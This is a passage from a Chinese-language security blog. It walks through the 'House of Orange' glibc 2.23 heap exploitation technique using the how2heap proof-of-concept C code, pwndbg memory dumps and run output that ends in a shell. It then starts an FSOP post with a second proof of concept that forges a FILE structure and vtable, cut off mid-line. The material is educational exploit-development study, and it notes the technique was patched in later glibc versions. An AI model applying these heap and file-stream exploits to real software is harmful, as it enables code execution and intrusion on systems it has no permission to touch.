class="line"><span class="comment">      heap start                              heap end</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       And the new area that gets allocated is contiguous to the old heap end.</span></span><br><span class="line"><span class="comment">       So the new size of the Top chunk is the sum of the old size and the newly allocated size.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       In order to keep track of this change in size, malloc uses a fencepost chunk,</span></span><br><span class="line"><span class="comment">       which is basically a temporary chunk.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       After the size of the Top chunk has been updated, this chunk gets freed.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       In our scenario however, the heap looks like</span></span><br><span class="line"><span class="comment">          |------------|------------|------..--|--...--|---------|</span></span><br><span class="line"><span class="comment">          |    chunk   |    chunk   | Top  ..  |  ...  | new Top |</span></span><br><span class="line"><span class="comment">          |------------|------------|------..--|--...--|---------|</span></span><br><span class="line"><span class="comment">     heap start                            heap end</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       In this situation, the new Top will be starting from an address that is adjacent to the heap end.</span></span><br><span class="line"><span class="comment">       So the area between the second chunk and the heap end is unused.</span></span><br><span class="line"><span class="comment">       And the old Top chunk gets freed.</span></span><br><span class="line"><span class="comment">       Since the size of the Top chunk, when it is freed, is larger than the fastbin sizes,</span></span><br><span class="line"><span class="comment">       it gets added to list of unsorted bins.</span></span><br><span class="line"><span class="comment">       Now we request a chunk of size larger than the size of the top chunk.</span></span><br><span class="line"><span class="comment">       This forces sysmalloc to be invoked.</span></span><br><span class="line"><span class="comment">       And ultimately invokes _int_free</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       Finally the heap looks like this:</span></span><br><span class="line"><span class="comment">          |------------|------------|------..--|--...--|---------|</span></span><br><span class="line"><span class="comment">          |    chunk   |    chunk   | free ..  |  ...  | new Top |</span></span><br><span class="line"><span class="comment">          |------------|------------|------..--|--...--|---------|</span></span><br><span class="line"><span class="comment">     heap start                                             new heap end</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    p2 = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      Note that the above chunk will be allocated in a different page</span></span><br><span class="line"><span class="comment">      that gets mmapped. It will be placed after the old heap&#x27;s end</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Now we are left with the old Top chunk that is freed and has been added into the list of unsorted bins</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Here starts phase two of the attack. We assume that we have an overflow into the old</span></span><br><span class="line"><span class="comment">      top chunk so we could overwrite the chunk&#x27;s size.</span></span><br><span class="line"><span class="comment">      For the second phase we utilize this overflow again to overwrite the fd and bk pointer</span></span><br><span class="line"><span class="comment">      of this chunk in the unsorted bin list.</span></span><br><span class="line"><span class="comment">      There are two common ways to exploit the current state:</span></span><br><span class="line"><span class="comment">        - Get an allocation in an *arbitrary* location by setting the pointers accordingly (requires at least two allocations)</span></span><br><span class="line"><span class="comment">        - Use the unlinking of the chunk for an *where*-controlled write of the</span></span><br><span class="line"><span class="comment">          libc&#x27;s main_arena unsorted-bin-list. (requires at least one allocation)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      The former attack is pretty straight forward to exploit, so we will only elaborate</span></span><br><span class="line"><span class="comment">      on a variant of the latter, developed by Angelboy in the blog post linked above.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      The attack is pretty stunning, as it exploits the abort call itself, which</span></span><br><span class="line"><span class="comment">      is triggered when the libc detects any bogus state of the heap.</span></span><br><span class="line"><span class="comment">      Whenever abort is triggered, it will flush all the file pointers by calling</span></span><br><span class="line"><span class="comment">      _IO_flush_all_lockp. Eventually, walking through the linked list in</span></span><br><span class="line"><span class="comment">      _IO_list_all and calling _IO_OVERFLOW on them.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      The idea is to overwrite the _IO_list_all pointer with a fake file pointer, whose</span></span><br><span class="line"><span class="comment">      _IO_OVERLOW points to system and whose first 8 bytes are set to &#x27;/bin/sh&#x27;, so</span></span><br><span class="line"><span class="comment">      that calling _IO_OVERFLOW(fp, EOF) translates to system(&#x27;/bin/sh&#x27;).</span></span><br><span class="line"><span class="comment">      More about file-pointer exploitation can be found here:</span></span><br><span class="line"><span class="comment">      https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      The address of the _IO_list_all can be calculated from the fd and bk of the free chunk, as they</span></span><br><span class="line"><span class="comment">      currently point to the libc&#x27;s main_arena.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    io_list_all = top[<span class="number">2</span>] + <span class="number">0x9a8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      We plan to overwrite the fd and bk pointers of the old top,</span></span><br><span class="line"><span class="comment">      which has now been added to the unsorted bins.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      When malloc tries to satisfy a request by splitting this free chunk</span></span><br><span class="line"><span class="comment">      the value at chunk-&gt;bk-&gt;fd gets overwritten with the address of the unsorted-bin-list</span></span><br><span class="line"><span class="comment">      in libc&#x27;s main_arena.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Note that this overwrite occurs before the sanity check and therefore, will occur in any</span></span><br><span class="line"><span class="comment">      case.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Here, we require that chunk-&gt;bk-&gt;fd to be the value of _IO_list_all.</span></span><br><span class="line"><span class="comment">      So, we should set chunk-&gt;bk to be _IO_list_all - 16</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"> </span><br><span class="line">    top[<span class="number">3</span>] = io_list_all - <span class="number">0x10</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      At the end, the system function will be invoked with the pointer to this file pointer.</span></span><br><span class="line"><span class="comment">      If we fill the first 8 bytes with /bin/sh, it is equivalent to system(/bin/sh)</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>( ( <span class="type">char</span> *) top, <span class="string">&quot;/bin/sh\x00&quot;</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      The function _IO_flush_all_lockp iterates through the file pointer linked-list</span></span><br><span class="line"><span class="comment">      in _IO_list_all.</span></span><br><span class="line"><span class="comment">      Since we can only overwrite this address with main_arena&#x27;s unsorted-bin-list,</span></span><br><span class="line"><span class="comment">      the idea is to get control over the memory at the corresponding fd-ptr.</span></span><br><span class="line"><span class="comment">      The address of the next file pointer is located at base_address+0x68.</span></span><br><span class="line"><span class="comment">      This corresponds to smallbin-4, which holds all the smallbins of</span></span><br><span class="line"><span class="comment">      sizes between 90 and 98. For further information about the libc&#x27;s bin organisation</span></span><br><span class="line"><span class="comment">      see: https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Since we overflow the old top chunk, we also control it&#x27;s size field.</span></span><br><span class="line"><span class="comment">      Here it gets a little bit tricky, currently the old top chunk is in the</span></span><br><span class="line"><span class="comment">      unsortedbin list. For each allocation, malloc tries to serve the chunks</span></span><br><span class="line"><span class="comment">      in this list first, therefore, iterates over the list.</span></span><br><span class="line"><span class="comment">      Furthermore, it will sort all non-fitting chunks into the corresponding bins.</span></span><br><span class="line"><span class="comment">      If we set the size to 0x61 (97) (prev_inuse bit has to be set)</span></span><br><span class="line"><span class="comment">      and trigger an non fitting smaller allocation, malloc will sort the old chunk into the</span></span><br><span class="line"><span class="comment">      smallbin-4. Since this bin is currently empty the old top chunk will be the new head,</span></span><br><span class="line"><span class="comment">      therefore, occupying the smallbin[4] location in the main_arena and</span></span><br><span class="line"><span class="comment">      eventually representing the fake file pointer&#x27;s fd-ptr.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      In addition to sorting, malloc will also perform certain size checks on them,</span></span><br><span class="line"><span class="comment">      so after sorting the old top chunk and following the bogus fd pointer</span></span><br><span class="line"><span class="comment">      to _IO_list_all, it will check the corresponding size field, detect</span></span><br><span class="line"><span class="comment">      that the size is smaller than MINSIZE &quot;size &lt;= 2 * SIZE_SZ&quot;</span></span><br><span class="line"><span class="comment">      and finally triggering the abort call that gets our chain rolling.</span></span><br><span class="line"><span class="comment">      Here is the corresponding code in the libc:</span></span><br><span class="line"><span class="comment">      https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#3717</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    top[<span class="number">1</span>] = <span class="number">0x61</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      Now comes the part where we satisfy the constraints on the fake file pointer</span></span><br><span class="line"><span class="comment">      required by the function _IO_flush_all_lockp and tested here:</span></span><br><span class="line"><span class="comment">      https://code.woboq.org/userspace/glibc/libio/genops.c.html#813</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      We want to satisfy the first condition:</span></span><br><span class="line"><span class="comment">      fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    FILE *fp = (FILE *) top;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      1. Set mode to 0: fp-&gt;_mode &lt;= 0</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    fp-&gt;_mode = <span class="number">0</span>; <span class="comment">// top+0xc0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      2. Set write_base to 2 and write_ptr to 3: fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    fp-&gt;_IO_write_base = (<span class="type">char</span> *) <span class="number">2</span>; <span class="comment">// top+0x20</span></span><br><span class="line">    fp-&gt;_IO_write_ptr = (<span class="type">char</span> *) <span class="number">3</span>; <span class="comment">// top+0x28</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      4) Finally set the jump table to controlled memory and place system there.</span></span><br><span class="line"><span class="comment">      The jump table pointer is right after the FILE struct:</span></span><br><span class="line"><span class="comment">      base_address+sizeof(FILE) = jump_table</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         4-a)  _IO_OVERFLOW  calls the ptr at offset 3: jump_table+0x18 == winner</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> *jump_table = &amp;top[<span class="number">12</span>]; <span class="comment">// controlled memory</span></span><br><span class="line">    jump_table[<span class="number">3</span>] = (<span class="type">size_t</span>) &amp;winner;</span><br><span class="line">    *(<span class="type">size_t</span> *) ((<span class="type">size_t</span>) fp + <span class="keyword">sizeof</span>(FILE)) = (<span class="type">size_t</span>) jump_table; <span class="comment">// top+0xd8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Finally, trigger the whole chain by calling malloc */</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment">     The libc&#x27;s error message will be printed to the screen</span></span><br><span class="line"><span class="comment">     But you&#x27;ll get a shell anyways.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">winner</span><span class="params">(<span class="type">char</span> *ptr)</span></span><br><span class="line">&#123; </span><br><span class="line">    system(ptr);</span><br><span class="line">    syscall(SYS_exit, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一般第一次brk的堆块大小都是0x21000，</p><p>首先模拟了任意大小的堆溢出，前面一直到<code>p2 = malloc(0x1000);</code>和我们上面分析的一样在制造unsorted bin</p><p><img src="/2023/04/06/House-of-orange/image-20230407001924067.png" alt="image-20230407001924067"></p><p>这0x1000的chunk被分配到新brk的topchunk上</p><p><img src="/2023/04/06/House-of-orange/image-20230407002211084.png" alt="image-20230407002211084"></p><p><code>  io_list_all = top[2] + 0x9a8;</code>根据unsortedbin的固定偏移定位到_io_list_all&#x3D;<strong>0x7ffff7dd2520</strong></p><p><img src="/2023/04/06/House-of-orange/image-20230407002519360.png" alt="image-20230407002519360"></p><p><code>  top[3] = io_list_all - 0x10;    memcpy( ( char *) top, &quot;/bin/sh\x00&quot;, 8);    top[1] = 0x61;</code></p><p><img src="/2023/04/06/House-of-orange/image-20230407002923144.png" alt="image-20230407002923144"></p><p>其余直接从<code>malloc(0x10)</code>往后推吧</p><p>把0x602400拿走时会chunk-&gt;bk-&gt;fd&#x3D;unsortedbin，我们会往io_list_all写入unsortedbin</p><p><strong>0x61是个重点</strong></p><ul><li><p>malloc(0x10)时会先把这个0x61大小的chunk放入0x60大小的smallbin里即main_arena+0xc0，然后切割他的bk所指的chunk</p><p><img src="/2023/04/06/House-of-orange/image-20230407012803059.png" alt="image-20230407012803059"></p></li><li><p>这个时候io_list_all里是main_arena+88,我们把它当作IO_FILE_plus结构体，他的_chain指针在main_arena+88+0x68&#x3D;main_arena+0xc0处，我们的第一个0x60smallbin里存的地址</p><p><img src="/2023/04/06/House-of-orange/image-20230407012846958.png" alt="image-20230407012846958"></p></li><li><p>也就是说io_list_all链表的下一个链表是0x602400，他的周围都是是我们的可控范围</p><p><img src="/2023/04/06/House-of-orange/image-20230407012952664.png" alt="image-20230407012952664"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span> *jump_table = &amp;top[<span class="number">12</span>]; <span class="comment">// controlled memory</span></span><br><span class="line">jump_table[<span class="number">3</span>] = (<span class="type">size_t</span>) &amp;winner;</span><br><span class="line">*(<span class="type">size_t</span> *) ((<span class="type">size_t</span>) fp + <span class="keyword">sizeof</span>(FILE)) = (<span class="type">size_t</span>) jump_table; <span class="comment">// top+0xd8</span></span><br></pre></td></tr></table></figure><p>我们选择一块可控内存伪造vtable，并覆盖写入他的_overflow指针</p></li><li><p>切割bk时由于bk不符合要求</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">bck = unsorted_chunks (av);</span><br><span class="line">fwd = bck-&gt;fd;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">&#123;</span><br><span class="line">    errstr = <span class="string">&quot;malloc(): corrupted unsorted chunks 2&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>会触发<code>malloc_printerr</code>,一直到_overflow</p><p><code>__libc_malloc</code> &#x3D;&gt; <code>malloc_printerr</code> &#x3D;&gt; <code>__libc_message</code> &#x3D;&gt; <code>abort</code> &#x3D;&gt; <code>fflush</code>&#x3D;&gt;<code>_IO_flush_all_lockp</code>&#x3D;&gt;<code>_IO_OVERFLOW</code></p><p>_IO_flush_all_lockp里需要绕过一些 具体参考FSOP _IO_OVERFLOW会以_IO_FILE_plus为第一个参数所以，我们在前面用memcpy( ( char *) top, “&#x2F;bin&#x2F;sh\x00”, 8)把他的开头赋值为system所需的参数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p *(<span class="keyword">struct</span> _IO_FILE_plus*)<span class="number">0x602400</span></span><br><span class="line">$<span class="number">1</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = <span class="number">1852400175</span>, </span><br><span class="line">    _IO_read_ptr = <span class="number">0x61</span> &lt;error: Cannot access memory at address <span class="number">0x61</span>&gt;, </span><br><span class="line">    _IO_read_end = <span class="number">0x7ffff7dd1bc8</span> &lt;main_arena+<span class="number">168</span>&gt; <span class="string">&quot;\270\033\335\367\377\177&quot;</span>, </span><br><span class="line">    _IO_read_base = <span class="number">0x7ffff7dd1bc8</span> &lt;main_arena+<span class="number">168</span>&gt; <span class="string">&quot;\270\033\335\367\377\177&quot;</span>, </span><br><span class="line">    _IO_write_base = <span class="number">0x2</span> &lt;error: Cannot access memory at address <span class="number">0x2</span>&gt;, </span><br><span class="line">    _IO_write_ptr = <span class="number">0x3</span> &lt;error: Cannot access memory at address <span class="number">0x3</span>&gt;, </span><br><span class="line">    _IO_write_end = <span class="number">0x0</span>, </span><br><span class="line">    _IO_buf_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_buf_end = <span class="number">0x0</span>, </span><br><span class="line">    _IO_save_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_backup_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_save_end = <span class="number">0x0</span>, </span><br><span class="line">    _markers = <span class="number">0x0</span>, </span><br><span class="line">    _chain = <span class="number">0x0</span>, </span><br><span class="line">    _fileno = <span class="number">0</span>, </span><br><span class="line">    _flags2 = <span class="number">0</span>, </span><br><span class="line">    _old_offset = <span class="number">4196319</span>, </span><br><span class="line">    _cur_column = <span class="number">0</span>, </span><br><span class="line">    _vtable_offset = <span class="number">0</span> <span class="string">&#x27;\000&#x27;</span>, </span><br><span class="line">    _shortbuf = <span class="string">&quot;&quot;</span>, </span><br><span class="line">    _lock = <span class="number">0x0</span>, </span><br><span class="line">    _offset = <span class="number">0</span>, </span><br><span class="line">    _codecvt = <span class="number">0x0</span>, </span><br><span class="line">    _wide_data = <span class="number">0x0</span>, </span><br><span class="line">    _freeres_list = <span class="number">0x0</span>, </span><br><span class="line">    _freeres_buf = <span class="number">0x0</span>, </span><br><span class="line">    __pad5 = <span class="number">0</span>, </span><br><span class="line">    _mode = <span class="number">0</span>, </span><br><span class="line">    _unused2 = <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">19</span> times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = <span class="number">0x602460</span></span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; p *(<span class="keyword">struct</span> _IO_jump_t*)<span class="number">0x602460</span>                                                                                                                                                                       </span><br><span class="line">$<span class="number">2</span> = &#123;</span><br><span class="line">  __dummy = <span class="number">0</span>, </span><br><span class="line">  __dummy2 = <span class="number">0</span>, </span><br><span class="line">  __finish = <span class="number">0x0</span>, </span><br><span class="line">  __overflow = <span class="number">0x4007df</span> &lt;winner&gt;, </span><br><span class="line">  __underflow = <span class="number">0x0</span>, </span><br><span class="line">  __uflow = <span class="number">0x0</span>, </span><br><span class="line">  __pbackfail = <span class="number">0x0</span>, </span><br><span class="line">  __xsputn = <span class="number">0x0</span>, </span><br><span class="line">  __xsgetn = <span class="number">0x0</span>, </span><br><span class="line">  __seekoff = <span class="number">0x0</span>, </span><br><span class="line">  __seekpos = <span class="number">0x0</span>, </span><br><span class="line">  __setbuf = <span class="number">0x0</span>, </span><br><span class="line">  __sync = <span class="number">0x0</span>, </span><br><span class="line">  __doallocate = <span class="number">0x0</span>, </span><br><span class="line">  __read = <span class="number">0x0</span>, </span><br><span class="line">  __write = <span class="number">0x602460</span>, </span><br><span class="line">  __seek = <span class="number">0x0</span>, </span><br><span class="line">  __close = <span class="number">0x0</span>, </span><br><span class="line">  __stat = <span class="number">0x0</span>, </span><br><span class="line">  __showmanyc = <span class="number">0x0</span>, </span><br><span class="line">  __imbue = <span class="number">0x0</span></span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure></li></ul><p>malloc fail 但拿到shell</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer /m/h/S/h/glibc_2.23&gt; ./house_of_orange </span><br><span class="line">The attack vector of this technique was removed by changing the behavior of malloc_printerr, which is no longer calling _IO_flush_all_lockp, in 91e7cf982d0104f0e71770f5ae8e3faf352dea9f (2.26).</span><br><span class="line">Since glibc 2.24 _IO_FILE vtable are checked against a whitelist breaking this exploit,https://sourceware.org/git/?p=glibc.git;a=commit;h=db3476aff19b75c4fdefbe65fcd5f0a90588ba51</span><br><span class="line">*** Error in `./house_of_orange&#x27;: malloc(): memory corruption: 0x00007ffff7dd2520 ***</span><br><span class="line">======= Backtrace: =========</span><br><span class="line">/lib/x86_64-linux-gnu/libc.so.6(+0x777f5)[0x7ffff7a847f5]</span><br><span class="line">/lib/x86_64-linux-gnu/libc.so.6(+0x8215e)[0x7ffff7a8f15e]</span><br><span class="line">/lib/x86_64-linux-gnu/libc.so.6(__libc_malloc+0x54)[0x7ffff7a911d4]</span><br><span class="line">./house_of_orange[0x4007d8]</span><br><span class="line">/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7ffff7a2d840]</span><br><span class="line">./house_of_orange[0x4005d9]</span><br><span class="line">======= Memory map: ========</span><br><span class="line">00400000-00401000 r-xp 00000000 00:2f 82                                 /mnt/hgfs/Share/how2heap/glibc_2.23/house_of_orange</span><br><span class="line">00600000-00601000 r--p 00000000 00:2f 82                                 /mnt/hgfs/Share/how2heap/glibc_2.23/house_of_orange</span><br><span class="line">00601000-00602000 rw-p 00001000 00:2f 82                                 /mnt/hgfs/Share/how2heap/glibc_2.23/house_of_orange</span><br><span class="line">00602000-00645000 rw-p 00000000 00:00 0                                  [heap]</span><br><span class="line">7ffff0000000-7ffff0021000 rw-p 00000000 00:00 0 </span><br><span class="line">7ffff0021000-7ffff4000000 ---p 00000000 00:00 0 </span><br><span class="line">7ffff77f7000-7ffff780d000 r-xp 00000000 08:01 790524                     /lib/x86_64-linux-gnu/libgcc_s.so.1</span><br><span class="line">7ffff780d000-7ffff7a0c000 ---p 00016000 08:01 790524                     /lib/x86_64-linux-gnu/libgcc_s.so.1</span><br><span class="line">7ffff7a0c000-7ffff7a0d000 rw-p 00015000 08:01 790524                     /lib/x86_64-linux-gnu/libgcc_s.so.1</span><br><span class="line">7ffff7a0d000-7ffff7bcd000 r-xp 00000000 08:01 791392                     /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">7ffff7bcd000-7ffff7dcd000 ---p 001c0000 08:01 791392                     /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">7ffff7dcd000-7ffff7dd1000 r--p 001c0000 08:01 791392                     /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">7ffff7dd1000-7ffff7dd3000 rw-p 001c4000 08:01 791392                     /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">7ffff7dd3000-7ffff7dd7000 rw-p 00000000 00:00 0 </span><br><span class="line">7ffff7dd7000-7ffff7dfd000 r-xp 00000000 08:01 791384                     /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">7ffff7fdc000-7ffff7fdf000 rw-p 00000000 00:00 0 </span><br><span class="line">7ffff7ff6000-7ffff7ff7000 rw-p 00000000 00:00 0 </span><br><span class="line">7ffff7ff7000-7ffff7ffa000 r--p 00000000 00:00 0                          [vvar]</span><br><span class="line">7ffff7ffa000-7ffff7ffc000 r-xp 00000000 00:00 0                          [vdso]</span><br><span class="line">7ffff7ffc000-7ffff7ffd000 r--p 00025000 08:01 791384                     /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">7ffff7ffd000-7ffff7ffe000 rw-p 00026000 08:01 791384                     /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">7ffff7ffe000-7ffff7fff000 rw-p 00000000 00:00 0 </span><br><span class="line">7ffffffde000-7ffffffff000 rw-p 00000000 00:00 0                          [stack]</span><br><span class="line">ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">whoami</span></span></span><br><span class="line">grxer</span><br></pre></td></tr></table></figure><h3 id="成功率"><a href="#成功率" class="headerlink" title="成功率"></a>成功率</h3><p>houseoforange成功率只有%50</p><p>_IO_flush_all_lockp函数，会根据_IO_list_all和chain字段来去依次遍历链表上的每个结构体，第一个结构体是main_arena+88 main_arena+88+0xc0是_mode字段</p><p>这个字段是libc随机的，0到0xffffffff之间的任意值，但是如果大于0x7fffffff的话该值就为负</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">     <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">   || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">       &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">                &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">   )</span><br><span class="line">  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">result = EOF;</span><br></pre></td></tr></table></figure><p>正数<code>(fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</code>一定成立，会遍历他的vtable，由于他的vtable我们没有控制，最终调用函数出差</p><p>所以负数才行<code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code>是相等的</p>]]></content>
      
      
      
        <tags>
            
            <tag> House Of Orange </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FSOP</title>
      <link href="/2023/04/06/FSOP/"/>
      <url>/2023/04/06/FSOP/</url>
      
        <content type="html"><![CDATA[<h2 id="File-Stream-Oriented-Programming"><a href="#File-Stream-Oriented-Programming" class="headerlink" title="File Stream Oriented Programming"></a>File Stream Oriented Programming</h2><p>FSOP利用前提要有libc地址，核心就是劫持_chain链表头_IO_list_all伪造_IO_FILE 项和vtable</p><p>之前exit()分析时会_IO_flush_all_lockp,里面会调用</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">           || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">               &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">                                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">           )</span><br><span class="line">          &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br></pre></td></tr></table></figure><p>_IO_flush_all_lockp会在以下触发</p><ol><li><p>当 libc 执行 abort 流程时</p></li><li><p>当执行 exit 函数时</p></li><li><p>当执行流从 main 函数返回时(其实也是最后调用exit)</p></li></ol><p>需要伪造的_IO_FILE绕过一下条件</p><ul><li>fp-&gt;_mode &lt;&#x3D; 0</li><li>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_list_all 0x7ffff7dd2520</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> mode_offset 0xc0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> writeptr_offset 0x28</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> writebase_offset 0x20</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> vtable_offset 0xd8</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">sh</span><span class="params">()</span> &#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *ptr;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> *list_all_ptr;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line"></span><br><span class="line">    *(<span class="type">long</span> <span class="type">long</span>*)((<span class="type">long</span> <span class="type">long</span>)ptr+mode_offset)=<span class="number">0x0</span>;</span><br><span class="line">    *(<span class="type">long</span> <span class="type">long</span>*)((<span class="type">long</span> <span class="type">long</span>)ptr+writeptr_offset)=<span class="number">0x1</span>;</span><br><span class="line">    *(<span class="type">long</span> <span class="type">long</span>*)((<span class="type">long</span> <span class="type">long</span>)ptr+writebase_offset)=<span class="number">0x0</span>;</span><br><span class="line">    *(<span class="type">long</span> <span class="type">long</span>*)((<span class="type">long</span> <span class="type">long</span>)ptr+vtable_offset)=((<span class="type">long</span> <span class="type">long</span>)ptr+<span 